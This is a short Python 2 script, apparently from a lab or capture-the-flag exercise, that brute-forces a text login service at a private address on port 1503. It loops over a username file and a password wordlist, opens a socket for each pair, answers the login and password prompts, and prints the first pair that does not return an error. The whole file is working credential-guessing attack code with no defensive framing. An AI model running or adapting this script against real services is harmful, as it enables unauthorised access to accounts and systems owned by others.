

import socket, time, sys


class GuessC:

	def __init__(self):
		self.hosts = "192.168.0.6"
		self.port = 1503
		self.user_file = "users.txt"
		self.dict = "passwords_john.txt"


	def recv_to(self, string, sock):
		data= ""
		while True:
			tmp = sock.recv(1)
			if tmp == "":
				break
			data += tmp
			if string in data:
				break
		return data


	def try_login(self):
		with open(self.user_file, "r") as u_f:
			for line in u_f:
				with open(self.dict, "r") as p_f:
					for p_line in p_f:
						soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						soc.connect((self.hosts, self.port))
						reply = self.recv_to("Enter login: ", soc)
						uname = line.rstrip("\r\n")
						soc.sendall("%s\r" %uname)
						reply = self.recv_to("Enter password: ", soc)
						pword = p_line.rstrip("\r\n")
						soc.sendall("%s\r" %pword)
						reply = soc.recv(12)
						if "Error!" in reply:
							print "nope"
						else:
							print "yes!! uname: " + line.rstrip("\r\n") + ", pword: " + p_line.rstrip("\r\n")
							sys.exit(1)
						soc.close()
						time.sleep(3)


if __name__ == "__main__":

	fc = GuessC()
	fc.try_login()



